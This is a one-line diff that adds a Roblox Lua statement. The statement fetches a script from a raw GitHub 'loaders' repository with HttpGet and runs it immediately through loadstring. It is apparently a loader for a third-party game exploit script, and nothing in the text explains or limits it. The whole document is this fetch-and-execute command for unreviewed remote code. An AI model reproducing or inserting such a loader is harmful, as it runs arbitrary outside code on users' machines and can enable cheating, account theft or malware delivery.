@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/kukirin-life-testing-spam7-vvw5zsy7l4nrbs.lua"))()
